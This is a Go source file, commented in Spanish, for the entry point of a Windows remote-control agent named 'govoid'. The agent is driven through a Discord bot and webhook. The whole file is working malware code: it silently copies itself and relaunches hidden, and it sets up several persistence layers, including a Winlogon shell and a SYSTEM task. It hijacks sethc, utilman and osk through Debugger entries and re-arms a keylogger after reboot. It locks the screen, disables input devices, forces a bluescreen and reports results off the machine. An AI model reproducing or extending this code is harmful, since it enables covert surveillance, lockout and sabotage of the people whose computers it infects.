//go:build windows

package main

import (
	"context"
	"errors"
	"log/slog"
	"os"
	"os/exec"
	"os/signal"
	"runtime/debug"
	"sync"
	"syscall"
	"time"

	"github.com/local/govoid/internal/bot"
	"github.com/local/govoid/internal/commands"
	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/util"
	"github.com/local/govoid/internal/win32"
)

// mutexName identifica esta instalación del agente. Una sola copia viva por
// sesión de Windows, aunque las cuatro capas de persistencia disparen a la vez
// en el logon. Lleva el ProductID del cliente: dos builds distintos en la misma
// máquina conviven sin estorbarse.
var mutexName = config.MutexName

func main() {
	args := os.Args[1:]

	// Sin credenciales no hay agente: un binario compilado sin inyectar el
	// token, la guild o el webhook se retira antes de tocar el disco. Antes
	// se instalaba igual y fallaba en bucle al conectar.
	if config.BotToken == "" || config.GuildID == "" || config.WebhookURL == "" {
		slog.Error("compilación sin credenciales: falta token, guild o webhook")
		return
	}

	// Hijo relanzado por el botón Elevate: deja el aviso para que el padre
	// suelte el mutex y sigue el arranque normal, sin salir.
	elevatedStart := false

	// Modos auxiliares: no tocan la sesión, no instalan nada y salen.
	if len(args) > 0 {
		switch args[0] {
		case "--noop":
			// Lo lanza el Debugger de sethc/utilman/osk: existe para que esas
			// puertas de la pantalla de inicio no hagan nada.
			return
		case "--service":
			if err := win32.RunService(); err != nil {
				os.Exit(1)
			}
			return
		case "--lockguard":
			if slot := win32.GuardSlot(args[1:]); slot >= 0 {
				win32.RunGuard(slot)
			}
			return
		case "--elevated":
			// El padre espera este aviso antes de retirarse. Se escribe antes
			// de pedir el mutex a propósito: el hijo no puede tomarlo mientras
			// el padre siga vivo, y el padre no debe salir hasta saber que el
			// UAC se aceptó.
			elevatedStart = true
			if err := win32.WriteElevationMarker(); err != nil {
				slog.Debug("elevación: marcador", "err", err)
			}
		case "--sessionwatch":
			// Lo dispara la tarea de arranque como SYSTEM: busca la sesión de
			// consola y arranca el agente dentro de ella. Es la capa que
			// devuelve el agente después de un bugcheck sin depender de que
			// alguien inicie sesión.
			runSessionWatch()
			return
		case "--sessionprobe":
			// Diagnóstico: prueba cada combinación de parámetros del arranque
			// entre sesiones y deja el resultado en sessionwatch.log.
			runSessionProbe()
			return
		case "--identity":
			// Escribe la identidad resuelta y sale. Sin bot, sin instalación,
			// sin tocar el escritorio: es el modo que usa el script de entrega
			// para verificar el binario antes de mandarlo.
			if len(args) > 1 {
				if err := os.WriteFile(args[1], []byte(commands.IdentityReport()), 0o644); err != nil {
					os.Exit(1)
				}
			}
			return
		}
	}

	setupLogging()

	// Cada paso del bugcheck queda en el diario antes de ejecutarse: si el
	// proceso muere a mitad, la última línea dice hasta dónde llegó.
	win32.SetBSODTrace(func(line string) { slog.Info("bsod traza", "paso", line) })

	// Instancia única: si otra copia ya tomó el mutex, esta sale en silencio.
	// La espera cubre el hueco en que el padre relanzado aún lo tiene tomado.
	// El hijo elevado espera más: su padre tarda en ver el marcador y salir.
	mutexWait := 6 * time.Second
	if elevatedStart {
		mutexWait = 25 * time.Second
	}
	if err := win32.AcquireSingleInstance(mutexName, mutexWait); err != nil {
		if !errors.Is(err, win32.ErrAlreadyRunning) {
			slog.Debug("mutex de instancia única", "err", err)
		} else if win32.HeartbeatFresh(4 * time.Minute) {
			// La instancia en marcha late: está conectada o arrancando y esta
			// copia sobra.
			slog.Info("instancia: agente sano en marcha, esta copia sale")
			return
		} else {
			// Proceso vivo pero sin latido: se quedó colgado antes de conectar.
			// El arranque manual toma el relevo en vez de desaparecer.
			killed := win32.TakeOverStaleAgent()
			slog.Warn("instancia: agente sin latido, tomando el relevo", "terminados", killed)
			time.Sleep(2 * time.Second)
			if retryErr := win32.AcquireSingleInstance(mutexName, 15*time.Second); retryErr != nil {
				slog.Info("instancia: no se pudo tomar el relevo", "err", retryErr)
				return
			}
		}
	}

	// Latido inicial: este proceso existe y está arrancando. Sin esto, una
	// copia lanzada por la tarea mientras esta todavía conecta vería el latido
	// viejo, mataría a la que está arrancando y entraría en un bucle de relevos.
	if hbErr := win32.WriteHeartbeat(); hbErr != nil {
		slog.Debug("latido: no se pudo escribir al arrancar", "err", hbErr)
	}

	// Auto-instalación obligatoria antes de cualquier otra cosa.
	if err := autoInstall(); err != nil {
		slog.Debug("auto-install", "err", err)
	}

	// Si el keylogger quedó encendido antes del último reinicio, se vuelve a
	// instalar el hook aquí: el operador no debería tener que recordarlo.
	win32.Default.RestoreIfArmed()

	// El candado manda sobre todo lo demás. Si la bandera existe —porque el
	// operador lo pidió o porque la máquina acaba de arrancar— la cortina sube
	// antes de que exista escritorio.
	if win32.LockRequested() {
		if err := win32.EnforceLock(commands.ShieldBinary()); err != nil {
			slog.Debug("candado", "err", err)
		}
	} else {
		// Red de seguridad: un cierre a medias pudo dejar el teclado apagado a
		// nivel de dispositivo. Sin esto la máquina arrancaría sin entrada.
		win32.RestoreInputDevices()
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	commands.CancelRoot = cancel

	// Preflight opcional del bugcheck: corre en este mismo proceso y deja el
	// resultado fuera de la máquina. GOVOID_DIAG lo activa para una captura
	// puntual sin ensuciar cada arranque.
	if os.Getenv("GOVOID_DIAG") != "" {
		go func() {
			time.Sleep(2 * time.Second)
			_ = util.PostWebhook("🩺 Preflight BSOD", 3447003, []util.EmbedField{
				{Name: "diagnostico", Value: "```\n" + win32.BSODDiagnostics() + "\n```"},
			})
		}()
	}

	// Cierre del bugcheck: si el arranque anterior dejó el aviso, se confirma
	// con el código real que Windows escribió en el registro de eventos.
	if method, pending := win32.PendingBugcheck(); pending {
		slog.Info("bugcheck: aviso pendiente encontrado", "metodo", method)
		go reportPendingBugcheck(method)
	} else {
		slog.Debug("bugcheck: sin aviso pendiente")
	}

	signals := make(chan os.Signal, 1)
	signal.Notify(signals, os.Interrupt, syscall.SIGTERM)
	go func() {
		select {
		case <-signals:
			cancel()
		case <-ctx.Done():
		}
	}()

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		// Si el gateway revienta, el proceso debe sobrevivir y reconectar; el
		// panic se escribe en el diario en vez de matar el agente.
		defer func() {
			if recovered := recover(); recovered != nil {
				slog.Error("panic en el bot", "panic", recovered, "stack", string(debug.Stack()))
			}
		}()
		bot.RunWithReconnect(ctx, func() error {
			return bot.Start(ctx)
		})
	}()

	<-ctx.Done()
	wg.Wait()
	time.Sleep(2 * time.Second)
}

func autoInstall() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	target := commands.InstallPath()

	if commands.IsInstalledPath(exe) {
		// Ya corremos desde una ruta estable: garantiza las capas y no se
		// relanza. Esto también cubre el arranque como shell de Winlogon.
		return commands.InstallAll()
	}

	// Primera ejecución desde otra ruta: copia, instala capas y relanza.
	if err := commands.InstallAll(); err != nil {
		slog.Debug("auto-install: persistencia parcial", "err", err)
	}

	if _, err := os.Stat(target); err != nil {
		return err
	}

	// El mutex se queda en el padre: el hijo reintenta hasta que este salga,
	// así ninguna copia del logon puede colarse en el hueco.
	cmd := exec.Command(target)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	if err := cmd.Start(); err != nil {
		return err
	}

	os.Exit(0)
	return nil
}

// reportPendingBugcheck cierra el círculo del bugcheck: lee el código que dejó
// Windows en el registro de eventos y lo manda fuera de la máquina. El aviso en
// disco solo se borra cuando el mensaje salió, para reintentar en el próximo
// arranque si la red aún no estaba lista.
func reportPendingBugcheck(method string) {
	// La red tarda en levantar tras un bugcheck. Sin esperar, el aviso se pierde
	// y el código real nunca llega al canal; el marcador queda en disco y se
	// reintenta en el siguiente arranque, pero el operador se queda a ciegas.
	waitCtx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	util.WaitUntilOnline(waitCtx)

	code, when, err := win32.LastBugcheckCode()

	fields := []util.EmbedField{
		{Name: "metodo", Value: "```\n" + method + "\n```"},
	}
	if err != nil {
		fields = append(fields, util.EmbedField{
			Name:  "codigo",
			Value: "```\nsin evento: " + err.Error() + "\n```",
		})
	} else {
		fields = append(fields, util.EmbedField{
			Name:  "codigo",
			Value: "```\n" + code + "\n" + when.Format(time.RFC3339) + "\n```",
		})
	}

	if postErr := util.PostWebhook("💀 Bugcheck confirmado", 3066993, fields); postErr != nil {
		slog.Warn("bugcheck: aviso pendiente, no se pudo publicar", "err", postErr)
		return
	}
	slog.Info("bugcheck: confirmado y publicado", "codigo", code)
	_ = win32.ClearPendingBugcheck()
}
